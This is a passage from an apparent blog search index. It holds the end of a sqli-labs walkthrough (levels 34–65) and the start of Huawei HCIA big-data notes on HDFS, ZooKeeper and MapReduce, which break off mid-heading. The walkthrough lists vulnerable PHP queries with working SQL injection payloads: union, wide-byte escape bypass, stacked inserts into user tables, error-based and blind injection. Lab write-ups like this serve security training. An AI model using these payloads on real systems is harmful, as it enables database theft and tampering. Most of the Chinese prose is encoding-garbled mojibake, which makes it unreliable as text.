0,1\";\n```\nåœ¨33çš„åŸºç¡€ä¸Šæ”¹ä¸ºpost\n\n- payload\n```bash\nuname=admin%df' union select 1,user()#&passwd=admin&submit=Submit\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231803570.png)\n\n## less-35\n- æºç \n```php\nfunction check_addslashes($string)\n{\n    $string = addslashes($string);\n    return $string;\n}\n\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n```\naddslashes()è½¬ä¹‰,ä½†æ˜¯æ­¤å¤„$idå¹¶æ²¡æœ‰è¢«å•å¼•å·åŒ…è£¹èµ·æ¥,æ‰€ä»¥ç›´æ¥æ³¨å…¥\n\n- payload\n```bash\n?id=0 union select 1,user(),3\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231820000.png)\n\n## less-36\n- æºç \n```php\nif(isset($_GET['id']))\n{\n$id=check_quotes($_GET['id']);\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n}\n\nfunction check_quotes($string)\n{\n    $string= mysql_real_escape_string($string);\n    return $string;\n}\n```\nmysql_real_escape_stringè½¬ä¹‰sqlè¯­å¥ä¸­çš„ä¸€ä¸‹å­—ç¬¦:\n  \\x00\n  \\n\n  \\r\n  \\\n  '\n  \"\n  \\x1a\n\n- payload\n```bash\n?id=0%df%27 union select 1,user(),3 --+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231825504.png)\n\n## less-37\n- æºç \n```php\n $uname = mysql_real_escape_string($uname1);\n        $passwd= mysql_real_escape_string($passwd1);\n\n        mysql_query(\"SET NAMES gbk\");\n        @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n```\nåŒä¸Šå…³ä¸€æ ·,åªæ˜¯æ”¹ä¸ºäº†POST\n\n- payload\n```bash\nuname=admin%df'union select 1,user()#&passwd=admin&submit=Submit\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231829492.png)\n\n## less-38\nå †å æ³¨å…¥\n- æºç \n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n/* execute multi query */\nif (mysqli_multi_query($con1, $sql))\n{\n    \n    \n    /* store first result set */\n    if ($result = mysqli_store_result($con1))\n    {\n        if($row = mysqli_fetch_row($result))\n        {\n            echo '<font size = \"5\" color= \"#00FF00\">';    \n            printf(\"Your Username is : %s\", $row[1]);\n            echo \"<br>\";\n            printf(\"Your Password is : %s\", $row[2]);\n            echo \"<br>\";\n            echo \"</font>\";\n        }\n//            mysqli_free_result($result);\n    }\n        /* print divider */\n    if (mysqli_more_results($con1))\n    {\n            //printf(\"-----------------\\n\");\n    }\n     //while (mysqli_next_result($con1));\n}\nelse \n    {\n    echo '<font size=\"5\" color= \"#FFFF00\">';\n    print_r(mysqli_error($con1));\n    echo \"</font>\";  \n    }\n/* close connection */\nmysqli_close($con1);\n```\n\n- payload\næŸ¥è¯¢æ•°æ® \n```bash\n?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231855703.png)\n\næ’å…¥æ•°æ®\néœ€è¦çŸ¥é“å½“å‰è¡¨ç»“æ„\n```bash\n?id=0';insert into users values(16,'test','test') --+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231858463.png)\n\n\n## less-39\n- æºç \n```php\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šå»æ‰'\n\n- payload\n```bash\n union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+\n```\n\n## less-40\n- æºç \n```php\n$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šå¢åŠ ')\n\n- payload\n```bash\n?id=0') union select 1,user(),3 --+\n```\n\n## less-41\n- æºç \n```php\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šå»æ‰')\n\n- payload\n```bash\n?id=0 union select 1,user(),3 --+\n```\n\n## less-41\n- æºç \n```php\n   $username = mysqli_real_escape_string($con1, $_POST[\"login_user\"]);\n   $password = $_POST[\"login_password\"];\n   \n   $sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\";\n```\n$passwordæ²¡æœ‰è¢«è¿‡æ»¤,ä½¿ç”¨å•å¼•å·é—­åˆ\n\n- payload\n\næŸ¥è¯¢\n```bash\nlogin_password=1'unioN select 1,user(),3 #&login_user=admin&mysubmit=Login\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231921724.png)  \n\n\næ’å…¥\n```bash\nlogin_password=1';insert into users values(17,'test','test') #&login_user=admin&mysubmit=Login\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231919744.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231919310.png)\n\n## less-43\n- æºç \n```php\n$sql = \"SELECT * FROM users WHERE username=('$username') and password=('$password')\";\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šå¢åŠ )\n\n- payload\n```bash\nlogin_password=1') unioN select 1,user(),3 #&login_user=admin&mysubmit=Login\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231924571.png)\n\n## less-44\nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šå»æ‰)\n\n\n## less-45\nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šæ·»åŠ )\n\n\n## less-46\norder byæ³¨å…¥,ä¸èƒ½ä½¿ç”¨union,ä½¿ç”¨æŠ¥é”™æ³¨å…¥\n\n- æºç \n```php\n$sql = \"SELECT * FROM users ORDER BY $id\";\n```\n\n- payload\n\n```bash\n?sort=1 and(extractvalue(0x0a,concat(0x0a,(select database()))))--+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231938034.png)\n\n\n## less-47\n- æºç \n```php\n $sql = \"SELECT * FROM users ORDER BY '$id'\";\n```\n\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ª'\n\n\n\n## less-48\n- æºç \n```php\n $sql = \"SELECT * FROM users ORDER BY $id\";\n```\nä¸46å…³çš„åŒºåˆ«åœ¨äºæ²¡æœ‰å›æ˜¾,ç›²æ³¨\n\n- payload\n```bash\n?sort=rand(ascii(left(database(),1))=115)\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231946966.png)\n\n\n## less-49\nå»¶æ—¶ç›²æ³¨\n- payload\n```bash\n?sort=1'and (if(ascii(substr((select username from users where%20id=1),1,1))=100,sleep(5),0))--+\n```\n\n## less-50\nåŒ46\n\n\n## less-51\nåŒ46,å¢åŠ 'é—­åˆ\n\n\n## Less-52\nåŒ41å †å æ³¨å…¥,ä¸è¿”å›æŠ¥é”™\n\n## Less-53\nå †å æ³¨å…¥,ä¸è¿”å›æŠ¥é”™,é—­åˆä¸º'\n\n## less-54\nå¾—åˆ°åº“å,ä½†æ˜¯åªæœ‰10æ¬¡æœºä¼š,10æ¬¡ä¹‹åè¡¨åå’Œå¯†ç ä¼šéšæœºæ›´æ”¹\n\n- æºç \n```php\n $sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\";\n```\n\n- payload\næŒ¨ä¸ªå¾€ä¸‹çŒœ\n```bash\n?id=0%27union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27%20--+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206232027057.png)\n\n## less-55\nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šä»¥)é—­åˆ\n\n## less-56\nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šä»¥')é—­åˆ\n\n## less-57\nåŒ54\n\n## less-58\næŠ¥é”™æ³¨å…¥\n- payload\n```bash\n?id=-1'union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+\n```\n\n## less-59\nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šå»æ‰'é—­åˆ\n\n## less-60\nåœ¨58çš„åŸºç¡€ä¸Š ä½¿ç”¨'\")é—­åˆ\n\n## Less-61\n'))é—­åˆ\n```bash\n?id=-1')) and  extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+\n```\n\n## Less-62-65\nåŸºäºæ—¶é—´çš„ç›²æ³¨","tags":["sqlæ³¨å…¥","é¶åœº"],"categories":["é¶åœº"]},{"title":"åä¸ºHCIA","url":"/2022/04/20/åä¸ºHCIA/","content":"# å¤§æ•°æ®æ¦‚è¿°&è§£å†³åŠæ³•\n\n## å¤§æ•°æ®çš„ç‰¹å¾ï¼ˆ5v+1cï¼‰\n- å¤§é‡ï¼šæ•°æ®é‡å·¨å¤§ï¼ŒMB,GB,TB,PB\n- å¤šæ ·ï¼šæ•°æ®ç±»å‹å¤šæ ·ï¼Œæ•°æ®æ¥æºå¤šæ · æ•°æ®æ¥æºï¼šæœåŠ¡å™¨æ—¥å¿—ã€ç½‘ç«™æµè§ˆä¿¡æ¯ã€ç¤¾äº¤\\\nç»“æ„åŒ–æ•°æ®ï¼šè¡¨æ ¼æ•°æ® å¹³å°ã€æ‘„åƒå¤´ä¿¡æ¯\\\nåŠç»“æ„åŒ–æ•°æ®ï¼šç½‘é¡µhtmlã€xml\\\néç»“æ„åŒ–æ•°æ®ï¼šè§†é¢‘ã€éŸ³é¢‘ã€å›¾ç‰‡ã€æ–‡å­—\n- é«˜é€Ÿï¼šæ•°æ®äº§ç”Ÿé€Ÿåº¦å¿«ã€æ•°æ®å¤„ç†é€Ÿåº¦å¿«\n- ä»·å€¼ï¼šä»·å€¼å¯†åº¦ä½\n- å‡†ç¡®ï¼šæ•°æ®çœŸå®æ€§\n- å¤æ‚ï¼šæ•°æ®äº§ç”Ÿé€Ÿåº¦å¿«ã€æ•°æ®çš„ç±»å‹å¤šæ ·ç­‰ç‰¹å¾ï¼Œå¯¼è‡´åšæ•°æ®å¤„ç†æ—¶å¤„ç†è¿‡ç¨‹å˜å¾—å¾ˆå¤æ‚\n\n## å¤§æ•°æ®å¤„ç†æµç¨‹\næ•°æ®é‡‡é›†->æ•°æ®é¢„å¤„ç†->æ•°æ®å­˜å‚¨->åˆ†ææŒ–æ˜->æ•°æ®å¯è§†åŒ–\n\n### å¤§æ•°æ®ä»»åŠ¡ç±»å‹\n- IOå¯†é›†å‹ä»»åŠ¡ï¼šå¤§é‡è¾“å…¥è¾“å‡ºè¯·æ±‚çš„ä»»åŠ¡IOèµ„æº\n- è®¡ç®—å¯†é›†å‹ä»»åŠ¡ï¼šæœ‰å¤§é‡çš„è®¡ç®—è¦æ±‚ï¼ŒCPUèµ„æº\n- æ•°æ®å¯†é›†å‹ä»»åŠ¡ï¼šæ•°æ®å¤„ç†ï¼Œå¹¶å‘æ•°æ®å¤„ç†\n\n## å¤§æ•°æ®çš„è®¡ç®—ç±»å‹ï¼ˆæ•°æ®å¤„ç†ç±»å‹ï¼‰\n- æ‰¹å¤„ç†ï¼šä¸€æ¬¡å¤„ç†ä¸€æ‰¹é‡æ•°æ®ï¼Œå¤„ç†çš„æ•°æ®é‡å¤§ï¼Œä½†æ˜¯å»¶è¿Ÿæ€§é«˜\n- æµå¤„ç†ï¼šä¸€æ¬¡å¤„ç†ä¸€æ¡æ•°æ®ï¼Œå¤„ç†çš„æ•°æ®é‡å°ï¼Œä½†æ˜¯å»¶è¿Ÿæ€§ä½\n- å›¾å¤„ç†ï¼šä»¥å›¾çš„å½¢å¼å±•ç¤ºæ•°æ®ï¼Œè¿›è¡Œå¤„ç†\n- æŸ¥è¯¢åˆ†æè®¡ç®—ï¼šæ£€ç´¢åŠŸèƒ½\n\n## å¤§æ•°æ®è§£å†³æ–¹æ¡ˆ\nFusioninsight HD:éƒ¨ç½²åœ¨x86æ¶æ„ä¸Š\nBigData pro:éƒ¨ç½²åœ¨ARMæ¶æ„ä¸Š\nMapReduce Serverï¼ˆMRSï¼‰:éƒ¨ç½²åä¸ºäº‘æœåŠ¡ä¸Š\n- é«˜æ€§èƒ½ï¼šæ”¯æŒè‡ªæˆ‘ç ”å‘çš„å­˜å‚¨ç³»ç»ŸCarbonData\n- æ˜“è¿ç»´ï¼šæä¾›äº†å¯è§†åŒ–çš„ç®¡ç†ç•Œé¢\n- é«˜å®‰å…¨ï¼šä½¿ç”¨Kerborse & Ldapå®ç°è®¤è¯ç®¡ç†å’Œæƒé™ç®¡ç†\n- ä½æˆæœ¬ï¼šæŒ‰éœ€è´­ä¹°ï¼Œè‡ªå®šä¹‰é…ç½®åº•å±‚æ¶æ„æ€§èƒ½\n\n# HDFSåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ\n\n## HDFS (Hadoopåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ)\n- åˆ›å»ºäºº:é“æ ¼å¡å»·\n- èµ·å§‹åŸå› :å¼€å‘ä¸€ä¸ªæœç´¢å¼•æ“-->å­˜å‚¨é—®é¢˜(å¤§é‡æ•°æ®çš„å­˜å‚¨)\n- googleè®ºæ–‡: GFS - googleè‡ªèº«çš„åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ `é—­æº`\n\n## HDFSç‰¹æ€§\nç†è®ºä¸ŠHDFSå­˜å‚¨å¯ä»¥æ— é™æ‰©å±•\n- åˆ†å¸ƒå¼:æŠŠå¤šèŠ‚ç‚¹çš„å­˜å‚¨ç³»ç»Ÿç»“åˆä¸ºä¸€ä¸€ä¸ªæ•´ä½“å¯¹å¤–æä¾›æœåŠ¡(æé«˜å­˜å‚¨èƒ½åŠ›)\n- å®¹é”™æ€§:é’ˆå¯¹æ¯ä¸ªæ•°æ®å­˜å‚¨å¤‡ä»½(é»˜è®¤3ä»½)ï¼Œå¤‡ä»½å­˜å‚¨åˆ†åˆ«å­˜åœ¨ä¸åŒçš„ä½ç½®ï¼Œå¦‚æœå¤‡ä»½æˆ–è€…æ•°æ®æœ‰ä¸¢å¤±ï¼Œä¼šå†è¿›è¡Œå¤‡ä»½ï¼Œä¿æŒä¸€ç›´éƒ½æ˜¯3ä»½\n- æŒ‰å—å­˜å‚¨:å—å¤§å°é»˜è®¤128M, ä¸€ä¸ªæ–‡ä»¶å¯ä»¥å­˜å‚¨åœ¨å¤šä¸ªå—,`ä½†æ˜¯ä¸€ä¸ªå—åªå­˜å‚¨ä¸€ä¸ªæ–‡ä»¶` \\\n  `å¥½å¤„:æ•°æ®ä¸¢å¤±é’ˆå¯¹ä¸¢å¤±çš„æ•°æ®æ‰€å±çš„å—ï¼Œåªæ¢å¤å½“å‰å—å°±å¯ä»¥`\n- å…ƒæ•°æ®:è®°å½•æ–‡ä»¶å­˜å‚¨åœ¨å“ªäº›å—,å—å­˜å‚¨åœ¨å“ªé‡Œç­‰ä¿¡æ¯ \\\n  æ¯ä¸ªå—éƒ½æœ‰ä¸€ä¸ªå…ƒæ•°æ®ä¿¡æ¯ï¼Œå¹¶ä¸”å…ƒæ•°æ®çš„å¤§å°æ˜¯å›ºå®šçš„150K\n  \n\n## HDFSé€‚ç”¨åœºæ™¯\n- å¯ä»¥åšå¤§æ–‡ä»¶\n- å¯ä»¥ååŠ©ç¦»çº¿å¤„ç†æˆ–æ‰¹å¤„ç†\n- æµå¼æ•°æ®è®¿é—®æœºåˆ¶\n\n## HDFSä¸é€‚åˆåšä»€ä¹ˆ\n- ä¸é€‚åˆå¤§é‡å°æ–‡ä»¶å­˜å‚¨\n- ä¸é€‚åˆåšå®æ—¶åœºæ™¯\n- ä¸é€‚åˆéšæœºè¯»å†™ï¼Œå¯ä»¥åšè¿½åŠ å†™\n\n## `HDFSä¸ºä»€ä¹ˆä¸é€‚åˆå¤§é‡å°æ–‡ä»¶å­˜å‚¨`\n    (ä¾‹: 10ä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å¤§å°ä¸º20M)\n1. 10ä¸ªæ–‡ä»¶éœ€è¦ä½¿ç”¨10ä¸ªå—ï¼Œå¹¶ä¸”æ¯ä¸ªå—åªæ˜¯ç”¨äº†20Mç©ºé—´---> å­˜å‚¨ç©ºé—´æµªè´¹\n2. æœ‰10ä¸ªå…ƒæ•°æ®ï¼Œå…ƒæ•°æ®150K\n3. å¯»å€æ—¶é—´å¢é•¿\n\nä¸é€‚åˆéšæœºè¯»å†™ï¼Œå¯ä»¥åšè¿½åŠ å†™\n\n\n## HDFSç³»ç»Ÿæ¶æ„\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151412876.png?token=ARYCSARTUOKY4IGIGBRS7KTCQCM62)\n\n- Client (å®¢æˆ·ç«¯) :ç”¨æˆ·æ¥å£ï¼Œç”¨æˆ·é€šè¿‡Clientè¿æ¥åˆ°ç»„ä»¶\n- NameNode (åç§°èŠ‚ç‚¹ï¼Œä¸»èŠ‚ç‚¹) :ç®¡ç†DataNode,å¹¶ä¸”æ¥æ”¶ç”¨æˆ·è¯·æ±‚,åˆ†å‘ä»»åŠ¡ï¼Œå­˜å‚¨å…ƒæ•°æ®ä¿¡æ¯\n- DataNode (æ•°æ®èŠ‚ç‚¹ï¼Œä»èŠ‚ç‚¹) :å®é™…å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œç»´æŠ¤è‡ªå·±çš„Blockå’Œå®é™…å­˜å‚¨ä½ç½®æ˜ å°„å…³ç³»\n- Block (å—) : æ•°æ®å­˜å‚¨\n\n\n## HDFSå•NameNodeçš„é—®é¢˜\n- å•åç§°èŠ‚ç‚¹æ•…éšœ:æ•´ä¸ªé›†ç¾¤éƒ½æ— æ³•ä½¿ç”¨--->HA(ä¸»å¤‡é…ç½®)\n- å•åç§°èŠ‚ç‚¹æ€§èƒ½ç“¶é¢ˆé—®é¢˜:å¹¶å‘å¤„ç†çš„ä»»åŠ¡é‡æœ‰é™---->è”é‚¦æœºåˆ¶\n\n## HDFS HAç‰¹æ€§(ä¸»å¤‡é…ç½®)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151412014.png?token=ARYCSAW7AVKCAPDCYNNV5YLCQCM74)\n- activeèŠ‚ç‚¹:å¯¹å¤–æä¾›æœåŠ¡\n- standbyèŠ‚ç‚¹:ä¸æ–­å¤‡ä»½activeèŠ‚ç‚¹çš„æ•°æ®ï¼Œ`å½“activeå®•æœº,standbyä¼šæˆä¸ºæ–°çš„active`\n- zookeeperç›‘æµ‹ä¸»èŠ‚ç‚¹çš„çŠ¶æ€ï¼Œä¸€æ—¦å‘ç°æ•…éšœï¼Œzookeeperå°±é€šçŸ¥å¤‡ç”¨èŠ‚ç‚¹æˆä¸ºæ–°çš„ä¸»èŠ‚ç‚¹\n\n\n## HDFSçš„è”é‚¦æœºåˆ¶\n    å„ä¸ªNNä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œç»´æŠ¤è‡ªå·±çš„å‘½åç©ºé—´\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151412309.png?token=ARYCSAUWS6RZPANWYMQDOCLCQCNAU)\n\n\n## HDFSå…ƒæ•°æ®æŒä¹…åŒ–(ä¸»å¤‡åŒæ­¥)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151412204.png?token=ARYCSAVN7VZ2UZ6V7RVJRITCQCNBS)\n\n1. å¤‡èŠ‚ç‚¹ä¼šé€šçŸ¥ä¸»èŠ‚ç‚¹æ–°å»ºä¸€ä¸ªEditlog.newæ–‡ä»¶ï¼Œ ä»è¿™ä¹‹åçš„æ“ä½œéƒ½è®°å½•åœ¨.newæ–‡ä»¶ä¸­\n2. å¤‡èŠ‚ç‚¹ä»ä¸»èŠ‚ç‚¹æ‹·è´Editlogã€Fsimageæ–‡ä»¶(åªæœ‰ç¬¬ä¸€ æ¬¡éœ€è¦ ä¸‹è½½Fsimage,åç»­åŒæ­¥ä½¿ç”¨æœ¬åœ°çš„)\n3. å°†ä¸¤ä¸ªæ–‡ä»¶è¿›è¡Œåˆå¹¶ï¼Œç”ŸæˆFsimage.ckptæ–‡ä»¶\n4. å¤‡èŠ‚ç‚¹å°†Fsimage.ckptä¸Šä¼ åˆ°ä¸»èŠ‚ç‚¹ä¸Š\n5. ä¸»èŠ‚ç‚¹æ¥æ”¶åˆ°Fsimage.ckptæ¢å¤æˆFsimage\n6. æŠŠEditlog.newé‡å‘½åEditlog\n\n\n## HDFSå‰¯æœ¬æœºåˆ¶ (3ä»½)\n- å­˜å‚¨å‰¯æœ¬è§„åˆ™: \n1. ç¬¬ä¸€ä»½å‰¯æœ¬å­˜æ”¾åœ¨åŒä¸€èŠ‚ç‚¹ä¸­(ä¼ è¾“æœ€å¿«,ä½†æ˜¯å¦‚æœèŠ‚ç‚¹æ•…éšœï¼Œå‰¯æœ¬ä¹Ÿä¼šä¸¢å¤±)\n2. ç¬¬äºŒä»½å‰¯æœ¬å­˜æ”¾åœ¨åŒä¸€æœºæ¶çš„ä¸åŒèŠ‚ç‚¹ä¸Š(å¦‚æœæ•´ä¸ªæœºæ¶æ•…éšœï¼Œå‰¯æœ¬ä¹Ÿä¼šä¸¢å¤±)\n3. ç¬¬ä¸‰åˆ†å‰¯æœ¬å­˜æ”¾åœ¨ä¸åŒæœºæ¶çš„å…¶ä»–èŠ‚ç‚¹ä¸Š\n- å‰¯æœ¬è·ç¦»å…¬å¼:`ä¼˜å…ˆé€‰æ‹©çš„æ˜¯è·ç¦»å°çš„`\n1. åŒèŠ‚ç‚¹çš„è·ç¦»ä¸º0\n2. åŒä¸€æœºæ¶ä¸åŒèŠ‚ç‚¹çš„è·ç¦»ä¸º2\n3. ä¸åŒæœºæ¶çš„èŠ‚ç‚¹è·ç¦»ä¸º4\n\n## HDFSè¯»å–æµç¨‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151413392.png?token=ARYCSAQS3MNXYXLIKXZRAT3CQCNFE)\n\n1. Clientå‘NameNodeå‘èµ·è¯»å–è¯·æ±‚\n2. NameNodeæ¥æ”¶åˆ°è¯·æ±‚ï¼Œåé¦ˆå¯¹åº”çš„å…ƒæ•°æ®ä¿¡æ¯ç»™Client\n3. Clientæ¥æ”¶åˆ°åé¦ˆè¯·æ±‚å¯¹åº”çš„DataNode `(å¦‚æœClientæœ¬åœ°æœ‰æ•°æ®ï¼Œä¼˜å…ˆä»æœ¬åœ°è¯»å–)`\n4. DataNodeæ¥æ”¶åˆ°è¯·æ±‚ï¼Œåé¦ˆæ•°æ®å†…å®¹ç»™Client\n5. å…³é—­è¯»å–æµ\n\n## HDFSå†™å…¥æµç¨‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151413093.png?token=ARYCSASXKVI2WMTKAJWTIR3CQCNF2)\n\n1. Clientå‘NameNodeå‘å‡ºå†™å…¥è¯·æ±‚\n2. NameNodeæ¥æ”¶åˆ°è¯·æ±‚åç”Ÿæˆè¯¥æ–‡ä»¶çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œåé¦ˆDataNodeä¿¡æ¯ç»™Client\n3. Clientæ¥æ”¶åˆ°DataNodeä¿¡æ¯ä¹‹åï¼Œè¯·æ±‚ç›¸å¯¹åº”çš„DataNode\n4. Clientæäº¤æ–‡ä»¶å†™å…¥åˆ°å¯¹åº”çš„DataNode\n5. DataNodeæ¥æ”¶åˆ°å†™å…¥è¯·æ±‚ï¼Œæ‰§è¡Œå†™å…¥\n6. Clientå†™å…¥ç¬¬ä¸€-ä¸ªèŠ‚ç‚¹åï¼Œç”±ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å†™å…¥ç¬¬äºŒä¸ªèŠ‚ç‚¹ï¼Œç¬¬äºŒä¸ªèŠ‚ç‚¹å†™å…¥ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹\n7. å†™å…¥å®Œæˆååé¦ˆå…ƒæ•°æ®ä¿¡æ¯ç»™Client\n8. å…³é—­è¯»å–æµï¼ŒNameNodeæ›´æ–°å…ƒæ•°æ®ä¿¡æ¯\n\n# ZooKeeper\n    åˆ†å¸ƒå¼æœåŠ¡åº”ç”¨ï¼Œå¯ä»¥å¸®åŠ©å…¶ä»–åˆ†å¸ƒå¼ç»„ä»¶åè°ƒç®¡ç†é›†ç¾¤\n\n## ZooKeeperçš„ç‰¹æ€§\n- åˆ†å¸ƒå¼æœåŠ¡, ZooKeeperé›†ç¾¤ä¸­æœ‰ä¸€åŠä»¥ä¸Šçš„èŠ‚ç‚¹å­˜æ´»é›†ç¾¤æ‰èƒ½æ­£å¸¸è¿è¡Œ\n- æœ€ç»ˆä¸€è‡´æ€§:æ‰€æœ‰çš„èŠ‚ç‚¹å¯¹å¤–æä¾›çš„æ˜¯åŒä¸€ä¸ªè§†å›¾\n- å®æ—¶æ€§:å®æ—¶è·å–ã€å®æ—¶åé¦ˆåº”ç”¨çŠ¶æ€\n- å¯é æ€§: ä¸€æ¡æ•°æ®è¢«-ä¸ªèŠ‚ç‚¹æ¥æ”¶åˆ°ï¼Œå°±ä¼šè¢«å…¶ä»–èŠ‚ç‚¹ä¹Ÿæ¥æ”¶\n- ç­‰å¾…æ— å…³æ€§:æ…¢çš„æˆ–è€…å¤±æ•ˆçš„clientè¯·æ±‚ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–å®¢æˆ·ç«¯è¯·æ±‚\n- åŸå­æ€§:æœ€ç»ˆçŠ¶æ€åªæœ‰æˆåŠŸæˆ–è€…å¤±è´¥\n\n## ZooKeeperé›†ç¾¤ä¸»ä»é€‰ä¸¾/ä¸»å¤‡åˆ‡æ¢\n- é€‰ä¸¾: zookeeperå†…éƒ¨æŠ•ç¥¨é€‰ä¸¾,å½“èŠ‚ç‚¹å¾—åˆ°ä¸€åŠä»¥ä¸Šçš„ç¥¨æ•°,å®ƒå°±ä¼šç§°ä¸ºLeader,å…¶ä»–çš„èŠ‚ç‚¹éƒ½æ˜¯Follower\n- ä¸»å¤‡åˆ‡æ¢:å½“leaderå‡ºç°æ•…éšœ,ä»å…¶ä»–çš„followerä¸­é‡æ–°é€‰ä¸¾æ–°çš„leader\n\n\n## ZooKeeperçš„å®¹ç¾èƒ½åŠ› \n    (å¯å®¹ç¾é›†ç¾¤æœ€ä½è¦æ±‚æ˜¯3ä¸ªèŠ‚ç‚¹)\n- åœ¨é›†ç¾¤è¿è¡Œè¿‡ç¨‹ä¸­å…è®¸å‘ç”Ÿæ•…éšœçš„èŠ‚ç‚¹æ•°(æœ€å¤§:èŠ‚ç‚¹æ•°-åŠ-1)\n- å¦‚:é›†ç¾¤åªè¦1ä¸ªèŠ‚ç‚¹ï¼Œå®¹ç¾èƒ½åŠ›ä¸º0\\\n    é›†ç¾¤åªè¦2ä¸ªèŠ‚ç‚¹ï¼Œå®¹ç¾èƒ½åŠ›ä¸º0\\\n    é›†ç¾¤åªè¦3ä¸ªèŠ‚ç‚¹ï¼Œå®¹ç¾èƒ½åŠ›ä¸º1\\\n    é›†ç¾¤åªè¦4ä¸ªèŠ‚ç‚¹ï¼Œå®¹ç¾èƒ½åŠ›ä¸º1\n- æ­å»ºé›†ç¾¤æ—¶ï¼Œå°½é‡é€‰æ‹©å¥‡æ•°å°èŠ‚ç‚¹è¿›è¡Œæ­å»º\n\n## ZooKeeperçš„è¯»ç‰¹æ€§\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151414245.png?token=ARYCSAUWFL3VQLC74QPFOFTCQCNHA)\n\n1. Clientå‘èµ·è¯»å–è¯·æ±‚\n2. è·å–åˆ°æ•°æ®(ä¸ç®¡æ¥æ”¶è¯·æ±‚çš„æ˜¯LeaderèŠ‚ç‚¹è¿˜æ˜¯FollowerèŠ‚ç‚¹)\n\n## ZooKeeperçš„å†™ç‰¹æ€§\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151414157.png?token=ARYCSAXYXQNR64JHII24XQDCQCNII)\n\n1. Clientå‘èµ·å†™å…¥è¯·æ±‚ å¦‚æœè¯·æ±‚åˆ°çš„èŠ‚ç‚¹ä¸æ˜¯leaderèŠ‚ç‚¹ï¼Œfollowerä¼šæŠŠè¯·æ±‚è½¬å‘ç»™leader\n2. leaderæ¥æ”¶åˆ°è¯·æ±‚åä¼šå‘æ‰€æœ‰èŠ‚ç‚¹å‘å‡ºè¯¢é—®æ˜¯å¦å¯ä»¥æ¥æ”¶å†™å…¥\n3. èŠ‚ç‚¹æ¥æ”¶åˆ°è¯¢é—®è¯·æ±‚,æ ¹æ®è‡ªèº«æƒ…å†µåé¦ˆæ˜¯å¦å¯å†™å…¥çš„ä¿¡æ¯ç»™leader\n4. leaderæ¥æ”¶åˆ°ä¸€åŠä»¥ä¸Šçš„èŠ‚ç‚¹å¯ä»¥å†™å…¥ï¼Œå†æ‰§è¡Œå†™å…¥\n5. å†™å…¥å®Œæˆååé¦ˆç»™client,å¦‚æœClientè¯·æ±‚çš„ä¸æ˜¯leader, leaderæŠŠå†™ å…¥çŠ¶æ€åé¦ˆç»™follower,ç”±followeråé¦ˆç»™client\n\n\n# MapReduce\n    æ•°æ®å¤„ç†(æ•°æ®è®¡ç®—)\n    åˆ›å»ºè€…:é“æ ¼å¡å»·\n    å‡ºå‘ç‚¹:æœç´¢å¼•æ“-->å¤„ç†é—®é¢˜google: mapreduceè®ºæ–‡MapReduceçš„ç‰¹æ€§:åˆ†å¸ƒå¼è®¡ç®—\n\n## MapReduceçš„ç‰¹æ€§:åˆ†å¸ƒå¼è®¡ç®—\n- 